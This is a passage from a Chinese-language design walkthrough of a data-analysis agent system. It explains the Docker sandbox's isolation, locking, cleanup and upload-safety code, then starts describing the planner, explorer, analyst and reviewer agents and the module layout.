        )
        logger.info(f"创建已停止的用户 Docker 沙箱: user_id={user_id}")
        return container
```

用 `containers.create` 而不是 `containers.run`——**只创建不启动**。启动推迟到真正要执行命令的时候。

**为什么这样分**：`get_backend()` 只是告诉上层「你可以用这个目录了」，此时不需要真的跑容器。容器是稀缺资源（`max_running_containers: 8`），能晚启动就晚启动。

### 8.3.5 数据卷的校验与迁移检测

```python
    def _get_existing_volume_sync(self, user_id: int) -> Volume | None:
        """获取并校验已存在的用户数据卷。"""
        client = self._get_client()
        volume_name = self._volume_name(user_id)
        try:
            volume = client.volumes.get(volume_name)
        except NotFound:
            return None
        volume.reload()
        expected_labels = self._resource_labels(user_id)
        actual_labels = volume.attrs.get("Labels") or {}
        if any(
            actual_labels.get(key) != value for key, value in expected_labels.items()
        ):
            raise RuntimeError(f"Docker 数据卷名称已被占用: {volume_name}")
        actual_driver = volume.attrs.get("Driver")
        actual_options = volume.attrs.get("Options") or {}
        expected_options = self._volume_driver_options(user_id)
        if (
            actual_driver != self._config.volume_driver
            or actual_options != expected_options
        ):
            raise RuntimeError(
                f"Docker 数据卷存储策略发生变更，需要迁移: {volume_name}"
            )
        return volume
```

**数据卷比容器严格得多**。容器可以「摘要不一致就删了重建」（因为数据在卷里），但卷里是**用户数据**，不能删。

所以这里的策略是：

1. **label 不匹配 → 报错**。说明这个名字被别人占了，不能动。
2. **驱动或驱动选项变了 → 报错，要求人工迁移**。

**为什么不像容器那样重建**：`volume_driver_options` 里可能包含配额参数。换驱动可能意味着从 `local` 换到支持硬配额的驱动——这需要数据迁移，不能自动做。

配置校验里也有对应保护：

```python
        if self.volume_driver != "local" and not any(
            "{max_user_storage_bytes}" in value
            for value in self.volume_driver_options.values()
        ):
            raise ValueError("数据卷驱动选项必须包含 max_user_storage_bytes 占位符")
```

**非 local 驱动必须带配额占位符**。因为默认的 `local` 驱动**不支持硬配额**——配置里明确注释了：

```yaml
  volume_driver: local # 用户持久化数据卷使用的 Docker Volume Driver。
  volume_driver_options: {} # local 驱动不支持硬配额；生产驱动应使用 {max_user_storage_bytes}。
```

这意味着**默认配置下用户存储没有硬上限**。文件级限制（`max_file_bytes`，52MB）是有的，但用户可以传很多个文件。生产部署应该换支持配额的驱动。

### 8.3.6 跨进程所有权协调

这是沙箱模块里最复杂的一块。要解决三个问题：

| 问题 | 机制 |
| --- | --- |
| API 和 Worker 同时创建/删除同一容器 | 分布式锁 |
| 一个操作正在跑，另一个进程不能判定它空闲 | 租约 |
| 删除后不能被重建 | 墓碑 |

**分布式锁**：

```python
    @contextmanager
    def _lock(self, suffix: str) -> Generator[None, None, None]:
        """获取支持后台续期的 Redis 分布式锁。"""
        lock = self._redis.lock(
            self._key(f"lock:{suffix}"),
            timeout=self._lock_timeout_seconds,
            blocking_timeout=self._wait_timeout_seconds,
            thread_local=False,
        )
        if not lock.acquire(blocking=True):
            raise SandboxOwnershipError(f"等待沙箱跨进程锁超时: {suffix}")
        stop = threading.Event()
        renewal_failed = threading.Event()

        def renew() -> None:
            """定期延长当前分布式锁的有效期。"""
            interval = max(1.0, self._lock_timeout_seconds / 3)
            while not stop.wait(interval):
                try:
                    lock.extend(self._lock_timeout_seconds, replace_ttl=True)
                except (LockError, RedisError):
                    renewal_failed.set()
                    return
```

**后台续期线程**：锁的 TTL 是 60 秒，每 20 秒续一次（`timeout / 3`）。这样：
- 持锁进程正常工作时，锁不会因为超时释放；
- 持锁进程崩溃时，最多 60 秒后锁自动释放，不会永久死锁。

`thread_local=False` 很重要——默认 `True` 时 Redis 锁实例是线程局部的，后台续期线程拿不到同一个锁对象。

**租约**：

```python
_REGISTER_OPERATION_SCRIPT = """
if redis.call("exists", KEYS[1]) == 1 then
    return 1
end
if redis.call("exists", KEYS[2]) == 1 then
    return 2
end
if redis.call("exists", KEYS[3]) == 1 or redis.call("exists", KEYS[4]) == 1 then
    return 3
end
redis.call("zadd", KEYS[5], ARGV[1], ARGV[2])
redis.call("zadd", KEYS[6], ARGV[1], ARGV[2])
return 0
"""
```

**用 Lua 脚本保证原子性**。脚本做四件事：

1. `KEYS[1]` / `KEYS[2]`：检查**删除墓碑**。有墓碑就返回 1 或 2（说明用户或会话已删除，拒绝操作）。
2. `KEYS[3]` / `KEYS[4]`：检查**维护 gate**。有 gate 就返回 3（说明有进程在做维护，如删会话/删用户，不能开始新操作）。
3. 都通过的话，往两个 zset 里加一个带过期时间的 token——这就是租约。
4. 返回 0 表示成功。

**为什么要原子**：如果分几次 Redis 调用，中间可能插入一次删除操作，导致「检查通过 → 删除 → 登记租约」的顺序错乱，操作会作用在一个已删除的会话上。

登记顺序也有讲究：

```python
        self._register_operation(
            user_id,
            conversation_id,
            token,
            user_active_key,
            conversation_active_key,
        )
        with self._operation_leases_lock:
            # 后台续租线程只读取该表；先登记 Redis 再公开本地租约，避免续租不存在的操作。
            self._operation_leases[token] = (
                user_active_key,
                conversation_active_key,
            )
```

**先写 Redis，再写本地表**。因为后台续期线程只看本地表——如果先写本地表再写 Redis，续期线程可能在 Redis 里还没这个 token 时就去续期，续期失败会误报错误。

**维护窗口**：

```python
    def _wait_for_idle(self, key: str, label: str) -> None:
        """等待指定活动租约集合清空。"""
        deadline = time.monotonic() + self._wait_timeout_seconds
        while self._prune_active(key):
            if time.monotonic() >= deadline:
                raise SandboxOwnershipError(f"等待沙箱操作结束超时: {label}")
            time.sleep(0.1)

    def is_user_active(self, user_id: int) -> bool:
        """返回用户是否仍有未过期的操作租约。"""
        return self._prune_active(self._active_user_key(user_id)) > 0

    @contextmanager
    def conversation_maintenance(
        self,
        user_id: int,
        conversation_id: UUID,
    ) -> Generator[None, None, None]:
        """独占会话入口并等待跨进程操作结束。"""
        label = f"conversation:{user_id}:{conversation_id}"
        with self._lock(f"{label}:gate"):
            self._wait_for_idle(
                self._active_conversation_key(user_id, conversation_id),
                label,
            )
            yield
```

**`conversation_maintenance` 的两步**：

1. **拿 gate 锁**。这会阻止新的操作登记（因为 Lua 脚本检查 gate）。
2. **等现有租约清空**。等所有正在跑的操作结束。

这样维护期间（删会话、准备工作区）不会和任何操作重叠。

`_prune_active` 会先清理 zset 里过期的 token 再计数——因为 Redis 的 zset 不会自动删除过期成员，必须显式清理。

### 8.3.7 空闲回收与容量控制

```python
    def cleanup_idle(self, user_id: int) -> None:
        """在用户操作结束后回收闲置 Container，始终保留 Volume。"""
        with self._ownership.user_maintenance(user_id), self._ownership.capacity():
            container = self._get_existing_container(user_id)
            if container is None:
                return
            idle_seconds = max(0.0, time.time() - self._activity_at(user_id))
            if idle_seconds < self._config.idle_stop_seconds:
                return
            if idle_seconds >= self._config.idle_remove_seconds:
                container.remove(force=True)
                logger.info(
                    f"删除空闲 Docker 沙箱并保留持久化数据卷: user_id={user_id}"
                )
                return
            if container.status == "running":
                container.stop(timeout=10)
                logger.info(f"停止空闲 Docker 沙箱: user_id={user_id}")
```

两个阈值：

| 配置 | 默认 | 行为 |
| --- | --- | --- |
| `idle_stop_seconds` | 600（10 分钟） | 停止容器（释放 CPU/内存，容器还在） |
| `idle_remove_seconds` | 3600（1 小时） | 删除容器（释放容器名和配置，**卷保留**） |

**注意 `container.remove(force=True)` 后面没有删卷**。数据卷独立于容器存在，删容器不删卷。

`_activity_at` 读的是 **Redis 里的活动时间**，不是本地时钟：

```python
    def _activity_at(self, user_id: int) -> float:
        """读取用户最近一次活动时间。"""
```

因为「最近活动」是跨进程的——API 进程刚处理了一个请求，Worker 进程也要知道这个用户不是空闲的。

**容量回收**：

```python
        for idle_user_id in candidates:
            if self._ownership.is_user_active(idle_user_id):
                continue
            # 所有调用路径都先取得用户维护租约、再取得容量锁。若持有容量锁
            # 等待 operation lease，用户删除会等待该 lease 后再申请容量锁，形成死锁。
            with (
                self._ownership.user_maintenance(idle_user_id),
                self._ownership.capacity(),
            ):
                current = self._get_existing_container(idle_user_id)
                if (
                    current is None
                    or current.status != "running"
                    or self._ownership.is_user_active(idle_user_id)
                ):
                    continue
                running = self._running_containers()
                if len(running) < self._config.max_running_containers:
                    break
                current.stop(timeout=10)
                logger.info(f"因容量限制停止空闲 Docker 沙箱: user_id={idle_user_id}")
                break
        else:
            raise SandboxCapacityUnavailableError("Docker 沙箱运行容量已满")
```

**注释里的死锁分析值得仔细读**：

- 所有路径都遵循「先拿用户维护租约，再拿容量锁」的顺序。
- 如果反过来（先容量锁、再等 operation lease），会发生：进程 A 持容量锁等用户 X 的租约释放；而用户 X 的租约持有者正在做删除操作，删除操作要申请容量锁 → 互相等待 → 死锁。

**固定加锁顺序是所有多锁场景的通用解法**。

**双重检查**：拿到锁之后再检查一次 `is_user_active`。因为从「第一次检查」到「拿到锁」之间，可能有新操作开始了。

**`for...else` 的用法**：`for` 循环正常结束（没 `break`）时执行 `else` 分支。这里的语义是「遍历完所有候选都没能腾出空间，就报容量不足」。如果 `break` 了（成功停掉一个容器，或发现容量够了），`else` 不执行。

**定时扫描**：

```python
    async def _cleanup_idle_containers(self) -> None:
        """定期停止或删除空闲容器，并始终保留数据卷。"""
        while True:
            try:
                await asyncio.sleep(self._config.cleanup_interval_seconds)
                await self._run_cleanup_cycle()
            except asyncio.CancelledError:
                raise
            except Exception as exc:  # noqa: BLE001
                error = f"清理循环失败: {exc}"
                logger.exception("Docker 沙箱清理循环异常")
                self._record_cleanup_result([error])
```

**这是 asyncio 循环，不是 Celery Beat 任务**。因为清理动作必须在**持有 Docker 客户端和 Redis 连接的进程**里做，而 Worker 进程的沙箱初始化是 `init(start_cleanup=False)`（不启动清理循环）。

**`except Exception` 里 `continue` 循环**——一次清理失败不能让整个循环退出，否则容器会永远不被回收。

`_record_cleanup_result` 记录连续失败次数，达到 `cleanup_failure_alert_threshold`（默认 3）时打告警。

### 8.3.8 命令执行：包装与限制

```python
        effective_timeout = self._internal_command_timeout_seconds
        if timeout is not None and timeout > 0:
            effective_timeout = min(timeout, self._internal_command_timeout_seconds)
        file_limit_blocks = max(1, self._max_file_bytes // 512)
        command_shell = (
            f"umask {self._umask:03o}; ulimit -f {file_limit_blocks}; "
            f"exec /bin/sh -lc {shlex.quote(command)}"
        )
        shell_command = ["/bin/sh", "-lc", command_shell]
        if effective_timeout > 0:
            shell_command = [
                "timeout",
                "--signal=KILL",
                str(effective_timeout),
                *shell_command,
            ]

        docker_client = self._container.client
        if docker_client is None:
            raise RuntimeError("Docker 容器客户端不可用")
        api_client = docker_client.api
        created = api_client.exec_create(
            self._container.id,
            shell_command,
            stdout=True,
            stderr=True,
            user=f"{self._execution_uid}:{self._execution_gid}",
            environment={
                "HOME": f"{self._workspace_dir}/.home",
                "UV_CACHE_DIR": f"{self._workspace_dir}/.cache/uv",
                "XDG_CACHE_HOME": f"{self._workspace_dir}/.cache",
                "TMPDIR": f"{self._workspace_dir}/.tmp",
                "TMP": f"{self._workspace_dir}/.tmp",
                "TEMP": f"{self._workspace_dir}/.tmp",
            },
            workdir=self._workspace_dir,
        )
```

**命令被三层包装**：

```bash
timeout --signal=KILL 60 /bin/sh -lc "umask 077; ulimit -f 102400; exec /bin/sh -lc '用户命令'"
```

| 层 | 作用 |
| --- | --- |
| `timeout --signal=KILL 60` | 硬超时。用 `KILL` 而不是默认的 `TERM`——模型可能写了捕获 `TERM` 的代码，`KILL` 不可捕获 |
| `umask 077` | 新建文件默认权限 600（只有属主可读写）。防止同容器内其他会话读到 |
| `ulimit -f 102400` | 单文件大小限制（`max_file_bytes // 512` = 块数）。**在系统调用层拦截**，比应用层检查更可靠——写入超过限制时进程会收到 `SIGXFSZ` |
| `exec` | 用用户命令替换掉中间 shell，少一个进程，也让 `timeout` 的信号能直接到达用户进程 |

**`shlex.quote(command)` 是防注入的关键**。用户命令（模型生成的）被单引号包裹并转义，所以命令里的 `;` `&&` `$()` 不会逃逸到外层 shell。

**注意 `user=f"{self._execution_uid}:{self._execution_gid}"`**：每条命令都以**会话的 UID** 执行，不是默认的 1000。

**环境变量全部指向会话工作目录**。这样：
- `pip` / `uv` 的缓存写在会话目录（不同会话不共享）；
- `TMPDIR` 指向会话目录，临时文件不会跑到只读的 `/` 上；
- `HOME` 也在这里，因为根文件系统只读。

### 8.3.9 上传的安全流程

```python
    def _put_archive(self, path: str, content: BinaryIO, size: int) -> None:
        """先写入受保护的暂存目录，再提交到当前可写根。"""
        relative_target = posixpath.relpath(path, self._workspace_dir)
        if relative_target == "." or relative_target.startswith("../"):
            raise SandboxPathError(path)
        staging_name = f"upload-{secrets.token_hex(20)}"
        staging_path = posixpath.join(self._staging_dir, staging_name)
        try:
            # Docker put_archive 只能以守护进程权限写入；先落到不可预测的暂存名，
            # 再由受控脚本校验目录属主并原子替换目标文件。
            with io.BytesIO() as archive_buffer:
                with tarfile.open(fileobj=archive_buffer, mode="w") as archive:
                    info = tarfile.TarInfo(name=staging_name)
                    info.size = size
                    info.mode = 0o600
                    info.uid = 0
                    info.gid = 0
                    archive.addfile(info, content)
                archive_buffer.seek(0)
                if not self._container.put_archive(self._staging_dir, archive_buffer):
                    raise OSError(f"暂存上传文件失败: {path}")
```

**这是一个「两阶段提交」的上传**，解决一个具体的权限问题：

- Docker 的 `put_archive` API **只能以守护进程（root）权限写入**，无法指定目标文件的属主。
- 如果直接写到目标位置，文件属主是 root，而模型进程是会话 UID——模型改不了自己的上传文件。
- 所以：先以 root 写到一个**名字不可预测的暂存文件**（`upload-<40位随机hex>`），再由一个 root 执行的受控脚本**校验目标目录属主后**把文件 `os.replace` 到目标位置（`replace` 后属主变成脚本设置的属主）。

**不可预测的文件名**是为了防止「模型提前在暂存目录放一个同名文件/符号链接」这类攻击（TOCTOU）。

**受控脚本的校验逻辑**：

```python
root_fd = os.open(root, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW)
directory_fd = os.dup(root_fd)
try:
    root_stat = os.fstat(root_fd)
    if (
        not stat.S_ISDIR(root_stat.st_mode)
        or root_stat.st_uid != owner_uid
        or root_stat.st_gid != owner_gid
    ):
        raise PermissionError("工作区所有者无效")
    for component in parts[:-1]:
        created = False
        try:
            os.mkdir(component, mode=directory_mode, dir_fd=directory_fd)
            created = True
        except FileExistsError:
            pass
        next_fd = os.open(
            component,
            os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW,
            dir_fd=directory_fd,
        )
        if created:
            os.fchown(next_fd, owner_uid, owner_gid)
            os.fchmod(next_fd, directory_mode)
        next_stat = os.fstat(next_fd)
        if next_stat.st_uid != owner_uid or next_stat.st_gid != owner_gid:
            raise PermissionError("目标目录所有者无效")
        os.close(directory_fd)
        directory_fd = next_fd
    os.replace(
        source,
        parts[-1],
        src_dir_fd=None,
        dst_dir_fd=directory_fd,
    )
```

这段代码用了很多 Linux 底层技巧，逐条解释：

| 技巧 | 作用 |
| --- | --- |
| `os.O_NOFOLLOW` | **不跟随符号链接**。如果某一级目录是符号链接，`open` 直接失败。这是防 TOCTOU 攻击的关键 |
| `os.O_DIRECTORY` | 要求打开的是目录，不是文件 |
| `dir_fd=...` | 相对目录 fd 打开。这样整个操作基于已打开的 fd，不受「路径中的某一段被替换」影响 |
| `os.fstat` + 属主检查 | 每级都验证属主。防止模型提前创建了一个属主不对的同名目录 |
| `os.replace` + `dst_dir_fd` | 原子替换，且在已校验的目录 fd 内操作 |

**为什么要逐级打开**：如果直接 `os.replace(src, "/data/a/b/c")`，路径解析过程中 `/data/a/b` 可能被替换成符号链接。逐级打开 + `O_NOFOLLOW` 保证每一级都是真实的、属主正确的目录。

**这套模式叫「用目录 fd 做安全路径遍历」**，是所有需要在不可信文件系统上做特权文件操作的标准做法。

### 8.3.10 UID 分配与注册表

```python
    @staticmethod
    def _allocate_uid(seed: bytes, used_uids: set[int]) -> int:
        """根据稳定种子确定性分配未使用的 Linux UID。"""
        uid_range = _MAX_SANDBOX_UID - _MIN_SANDBOX_UID + 1
        for attempt in range(uid_range):
            digest = hashlib.blake2s(seed + attempt.to_bytes(8, "big")).digest()
            candidate = _MIN_SANDBOX_UID + int.from_bytes(digest[:8], "big") % uid_range
            if candidate not in used_uids:
                return candidate
        raise RuntimeError("沙箱 UID 分配范围已耗尽")
```

**用 blake2s 哈希分配而不是随机数**，因为需要**确定性**：同一个会话（同样的 seed）在容器重建后应该拿到同一个 UID，否则旧文件的属主就失效了。

**为什么需要 UID 隔离**：

```
同一容器内：
  /data/<conv-A>/sessions/...  属主 = uid 1001
  /data/<conv-B>/sessions/...  属主 = uid 1002
  /data/<conv-A>/sessions/analysis-1/...  属主 = uid 1001（Conversation 级）
  /data/<conv-A>/sessions/analysis-1/explorer/sess-1/...  属主 = uid 1003（Session 级）
```

**Linux 内核保证一个进程不能写另一个 UID 拥有的文件**（在没有 `CAP_DAC_OVERRIDE` 的情况下，而容器已经 `cap_drop: ALL`）。这比纯路径检查强得多——路径检查在应用层，可能有漏；UID 隔离在内核层，绕不过去。

**目录树的创建**：

```python
        conversation_name = str(conversation_id)
        self.put(
            container,
            SANDBOX_DATA_ROOT,
            [
                (conversation_name, conversation_uid, conversation_uid, 0o750),
                (
                    f"{conversation_name}/.home",
                    conversation_uid,
                    conversation_uid,
                    0o700,
                ),
                (
                    f"{conversation_name}/.cache",
                    conversation_uid,
                    conversation_uid,
                    0o700,
                ),
                (
                    f"{conversation_name}/.cache/uv",
                    conversation_uid,
                    conversation_uid,
                    0o700,
                ),
                (
                    f"{conversation_name}/.tmp",
                    conversation_uid,
                    conversation_uid,
                    0o700,
                ),
            ],
            [],
        )
        self.put(
            container,
            SANDBOX_STAGING_ROOT,
            [
                (conversation_name, 0, 0, 0o700),
                (f"{conversation_name}/{conversation_uid}", 0, 0, 0o700),
            ],
            [],
        )
        return conversation_uid
```

**元组是 `(路径, uid, gid, 权限)`**。工作区属主是会话 UID，暂存区属主是 root（0:0）——**暂存区模型不能写**，这正是前面上传流程需要的。

权限设计：

| 目录 | 权限 | 含义 |
| --- | --- | --- |
| `/data` | 0711 | 能进入，不能列出（镜像里设的） |
| Conversation 目录 | 0750 | 属主可读写执行，同组可读执行 |
| `.home` / `.cache` / `.tmp` | 0700 | 只有属主可访问 |
| Session 目录 | 0750 / 0640（文件） | 见下一段 |

**Session 的属主分层**：

```python
        parts = PurePosixPath(relative_path).parts
        directories: list[tuple[str, int, int, int]] = []
        current_path = workspace
        for index, component in enumerate(parts[:-1], start=1):
            current_path = posixpath.join(current_path, component)
            info = self.inspect_path(container, current_path)
            # sessions/<analysis>/<agent>/<session>/ 以内由 Session UID 持有；其上层
            # 目录继续属于 Conversation UID，保证不同 Agent Session 彼此隔离。
            directory_uid = (
                session_uid
                if session_uid is not None and index >= 4
                else conversation_uid
            )
```

**第 4 层及以下归 Session UID**（`sessions` / `<analysis>` / `<agent>` / `<session>` 是 4 段），其上层归 Conversation UID。

**为什么要分层**：同一个 Analysis 下的多个 Session（explorer / analyst / reviewer）互相之间要能读（analyst 要读 explorer 的产物），但不应该能写。Conversation UID 对上层目录有权限，所以会话级的操作（如读附件）能进行；Session UID 只对自己那一层及以下有写权限。

文件权限也随之变化：

```python
        self._file_mode = 0o640 if session_scope is not None else 0o600
        self._directory_mode = 0o750 if session_scope is not None else 0o700
        self._umask = 0o027 if session_scope is not None else 0o077
```

Session 里文件是 640（同组可读），普通会话里是 600（只有自己可读）。这就是「跨 Agent 传产物」能work的权限基础。

### 8.3.11 Shell Job：长命令的后台化

`shell` 工具面对一个矛盾：模型希望「执行命令，拿结果」，但有些命令要跑几分钟（比如 analyst 渲染报告）。如果同步等，模型调用会超时。

**做法**：前台等 60 秒，超时就转后台，返回 `job_id`。

```python
        try:
            await self._wait_until_started_or_done(record)
            if not record.done.is_set():
                try:
                    await asyncio.wait_for(
                        asyncio.shield(record.done.wait()),
                        timeout=self._foreground_wait_seconds,
                    )
                except TimeoutError:
                    with self._lock:
                        if not record.done.is_set():
                            record.detached = True
                            return self._result(record)

            with self._lock:
                foreground_output = self._foreground_output(record)
            await self._discard_foreground(record)
            return foreground_output
```

**`asyncio.shield` 是关键**：它保护 `record.done.wait()` 不被 `wait_for` 的超时取消。如果不 shield，超时会把 `wait()` 这个协程取消掉，而后台任务本身还在跑——但监控任务可能因此中断。`shield` 让超时只影响等待方，不影响被等待的任务。

**日志路径与控制路径分离**：

```python
    def _paths(self, job_id: str) -> tuple[str, str]:
        """生成受控日志路径和模型不可见的控制路径。"""
        self._validate_job_id(job_id)
        relative_log_path = f"large_tool_results/shell_jobs/{job_id}.log"
        return (
            posixpath.join(self._backend.workspace_dir, relative_log_path),
            posixpath.join(self._backend._staging_dir, "shell_jobs", f"{job_id}.json"),
        )
```

| 路径 | 位置 | 模型可见？ |
| --- | --- | --- |
| 日志 | `workspace_dir/large_tool_results/shell_jobs/<job>.log` | 是（可以 `read_file` 看完整输出） |
| 控制文件 | `_staging_dir/shell_jobs/<job>.json` | **否**（暂存目录模型无权限） |

**为什么要分离**：控制文件里存的是进程组 ID、PID 这类信息。如果模型能改它，就能伪造「任务已结束」或「取消别的任务」。

**取消走进程组**：

```python
        _, control_path = self._paths(job_id)
        with self._backend._operation():
            result = self._backend._container.exec_run(
                [
                    "timeout",
                    "--signal=KILL",
                    str(self._backend._internal_command_timeout_seconds),
                    "python3",
                    "-c",
                    _CANCEL_SHELL_JOB_SCRIPT,
                    control_path,
                    str(_SHELL_JOB_CANCEL_GRACE_SECONDS),
                ],
                user="0",
                privileged=True,
                workdir=SANDBOX_DATA_ROOT,
            )
```

**取消脚本先 `SIGTERM` 再等 grace 再 `SIGKILL`**，返回 `{ready, signal_sent, exited}` 三态。**为什么不直接 KILL**：给进程一个清理的机会（写日志、删临时文件），只有在 grace 期间没退出才强杀。

**`user="0", privileged=True`**：取消脚本要以 root 执行，因为它要杀的是会话 UID 的进程组——同 UID 才能杀，而调用方（API 进程）不在容器内。这里通过「受控脚本 + 参数校验」来保证安全，而不是靠权限。

**为什么用进程组而不是单进程**：模型可能写 `python script.py &` 或者 `sh -c "a | b"`，产生多个进程。只杀父进程会留下孤儿。用 `killpg` 杀整个进程组，一次清干净。

## 8.4 测试

**没有单元测试目录，也没有 `__main__` 入口**。验证依赖 Docker 和镜像。

### 8.4.1 验证镜像与隔离基线

```bash
docker images | grep dataagent-sandbox
```

预期一行 `dataagent-sandbox   latest   <id>   ...`。

```bash
docker run --rm -it --network none --user 1000:1000 -w /data \
  dataagent-sandbox:latest /bin/sh -lc "id; touch /data/probe && ls -l /data/probe"
```

预期：`uid=1000(sandbox) gid=1000(sandbox)`，且 `/data/probe` 创建成功。

### 8.4.2 验证断网

```bash
docker run --rm --network none dataagent-sandbox:latest \
  /bin/sh -lc "python -c \"import urllib.request; urllib.request.urlopen('https://pypi.org')\""
```

预期：抛网络不可达异常。**这是刻意设计**，不是 bug。

### 8.4.3 验证中文字体与数据分析栈

```bash
docker run --rm dataagent-sandbox:latest \
  /bin/sh -lc "fc-match 'WenQuanYi Zen Hei'"

docker run --rm dataagent-sandbox:latest \
  /bin/sh -lc "python -c 'import pandas, duckdb, matplotlib, polars; print(\"ok\")'"
```

预期：第一句输出 `wqy-zenhei.ttc: "WenQuanYi Zen Hei" ...`；第二句输出 `ok`。

### 8.4.4 验证只读根文件系统

```bash
docker run --rm --read-only --tmpfs /tmp:rw --network none \
  dataagent-sandbox:latest /bin/sh -lc "touch /evil 2>&1 || echo 'root is read-only'"
```

预期：输出 `root is read-only`（`touch` 失败）。

### 8.4.5 端到端观察容器生命周期

跑一次对话（问一个需要取数的问题），同时观察容器：

```bash
# 看容器是否被创建（停止态）
docker ps -a --filter label=dataagent.sandbox.deployment=local

# 执行期间看是否变成 running
docker ps --filter label=dataagent.sandbox.deployment=local

# 看数据卷
docker volume ls | grep dataagent
```

预期时序：

1. 首次访问时出现一个**停止态**容器（`docker ps -a` 能看到，`docker ps` 看不到）；
2. 真正执行命令时容器变成 running；
3. 空闲 10 分钟后（`idle_stop_seconds: 600`）容器停止；
4. 空闲 1 小时后（`idle_remove_seconds: 3600`）容器被删除，**但 `docker volume ls` 里那个卷还在**。

### 8.4.6 验证会话目录隔离

一次多 Agent 分析跑完后，进容器看目录结构：

```bash
docker run --rm -v "$(docker volume ls -q | grep dataagent | head -1)":/data \
  dataagent-sandbox:latest /bin/sh -lc "ls -la /data/*/sessions/*/*/ | head -40"
```

预期：能看到 `sessions/<analysis_id>/<agent_type>/<session_id>/` 的层次结构，各 Session 目录的属主 UID 不同。

### 8.4.7 验证所有权协调（需要两个进程并发）

这一步比较难手工构造，可以用日志观察：

```bash
grep -h "沙箱" logs/*.jsonl | tail -30
```

关注这几类日志：

- `创建已停止的用户 Docker 沙箱: user_id=...`
- `重建过期的 Docker 沙箱: user_id=...`
- `停止空闲 Docker 沙箱: user_id=...`
- `删除空闲 Docker 沙箱并保留持久化数据卷: user_id=...`
- `因容量限制停止空闲 Docker 沙箱: user_id=...`

如果出现「等待沙箱跨进程锁超时」或「沙箱操作租约续期失败」，说明 Redis 有抖动或锁超时配置偏小。

---

# 9. 多 Agent 分析体系（assistant）

## 9.1 需求说明

这是整个系统的主体。前面所有模块（元数据、查询、沙箱、授权）都是为它提供能力的。

**要解决什么问题**：用户用中文问一个分析问题，系统要自动完成「找数据 → 取数 → 算数 → 出图 → 写报告 → 自审」这条链路。单个 LLM 做不了这件事——上下文会爆、能力会混、错误无法发现。

**做法**：一个 Planner 统筹，三个专业 Agent 分工，通过 `delegation` 工具调度，用 LangGraph Checkpoint 持久化状态，用 SSE 把过程推给前端。

**四个 Agent 的定位**（提示词原文摘录）：

| Agent | 提示词里的角色定位 |
| --- | --- |
| planner | 「你是数据分析 Planner，负责统筹全局分析任务的拆解、跨专业 Agent 的流程编排以及最终交付物的汇总输出。」 |
| explorer | 「你是 explorer 专业 Agent，负责数据源探索、语义检索、编写并执行只读 SQL 查询，以及生成可审计的数据产物。」 |
| analyst | 「你是 analyst 专业 Agent，负责基于上游数据产物执行统计分析、归因下钻、图表绘制与自包含 HTML 报告生成。」 |
| reviewer | 「你是 reviewer 专业 Agent，负责独立审查上游数据产物、SQL 查询、分析计算逻辑、可视化图表及交付成果。」 |

**输入输出**：

| 能力 | 输入 | 输出 |
| --- | --- | --- |
| 发起回合 | conversation_id + 用户消息（文本/图片/附件引用） | SSE 事件流 |
| 恢复回合 | conversation_id | SSE 事件流 |
| 订阅运行中的回合 | conversation_id | SSE 事件流（先回放再实时） |
| 停止回合 | conversation_id | 204 |
| 读消息列表 | conversation_id | 消息数组 |
| 读子 Agent 活动 | delegation 定位信息 | 该次委派的消息与状态 |

**一次用户回合中间要经过哪些步骤**：

```
POST /api/v1/chat/stream
  → ConversationTurnService.start        更新会话状态（草稿转正式、生成标题任务）
  → ConversationRunService.start_turn    注册后台 Run，创建 asyncio 任务
  → 立即返回 StreamingResponse            SSE 订阅开始
       │
       └─（后台任务）chat.run_agent_turn
            → AgentManager.get_conversation_runtime   取/建会话级运行时
            → AgentManager.execution                  登记回合并拿 advisory lock
            → Planner.astream(stream_mode=["updates","custom","messages"])
                 ├─ messages  → 思考/正文增量事件
                 ├─ custom    → 子 Agent 活动事件
                 └─ updates   → 完整消息事件
            → 事件缓存 + 广播给所有订阅者
            → 结束：发 done 事件，清理 Run
```

## 9.2 代码组织规划

```
app/assistant/
├── __init__.py
├── errors.py                        模块业务异常
├── message_content.py               从 LangChain 消息提取正文/思考文本
├── model_factory.py                 ★ 按配置构造模型（含 DeepSeek Responses 适配）
├── providers.py                     会话生命周期服务装配
├── tasks.py                         Celery 任务：标题生成、资源删除、草稿清理
│
├── api/
│   ├── dependencies.py              三个进程级依赖（AgentManager / RunService / Lifecycle）
│   ├── chat/
│   │   ├── router.py                ★ 会话 CRUD + SSE 三个入口
│   │   └── dependencies.py          请求级会话仓储
│   └── attachment/
│       ├── router.py                附件上传/下载/删除
│       └── errors.py
│
├── contracts/
│   └── chat.py                      全部请求/响应与 9 种 SSE 事件模型
│
├── models/
│   ├── conversation.py              Conversation ORM（含删除墓碑字段）
│   └── conversation_tombstone.py    墓碑模型
│
├── repositories/
│   └── conversation.py              ConversationPGRepo
│
├── services/
│   ├── chat.py                      ★ 执行回合 + 事件投影
│   ├── conversation_run.py          ★ 515 行，Run 与订阅解耦
│   ├── conversation_turn.py         用户回合用例（状态更新 + 启动 Run）
│   ├── conversation_lifecycle.py    跨存储会话删除
│   ├── conversation_title.py        会话标题生成
│   ├── conversation_tombstone_store.py  删除墓碑存储
│   ├── message_projection.py        ★ 514 行，LangChain 消息 → 接口消息
│   └── contracts.py                 端口协议
│
└── agents/
    ├── manager.py                   ★ AgentManager：运行时缓存 + 执行 + 删除
    ├── runtime_factory.py           ★ 会话级运行时装配
    ├── contracts.py                 ★ 协议模型 + 运行时数据结构
    ├── specialists.py               专业 Agent 定义与工厂
    ├── specialist_agent.py          专业 Agent 共用构造逻辑
    ├── specialist_checkpoint.py     Specialist Checkpoint 只读投影
    ├── checkpoint_reader.py         LangGraph Checkpoint 只读读取
    ├── session_service.py           ★ 902 行，委派执行与并发控制
    ├── session_store.py             Session 状态访问 + 跨进程锁与容量
    ├── shell_jobs.py                Shell Job 运行时
    ├── filesystem.py                文件系统装配（含只读技能挂载）
    ├── mcp.py                       MCP 工具加载
    │
    ├── planner/
    │   ├── agent.py                 Planner 构造器
    │   ├── prompt.py                Planner 系统提示词
    │   └── tools/
    │       ├── delegation.py        ★ delegation 工具
    │       ├── list_sessions.py
    │       └── delete_session.py
    │
    ├── explorer/
    │   ├── agent.py                 Explorer 构造器
    │   ├── prompt.py
    │   ├── recall_runtime.py        召回运行时装配
    │   ├── semantic_recall_handler.py  ★ 427 行，召回工具的实现
    │   ├── semantic_recall_protocol.py 召回引用协议
    │   └── tools/
    │       ├── semantic_recall.py   5 个召回工具定义
    │       └── execute_sql.py       SQL 执行工具
    │
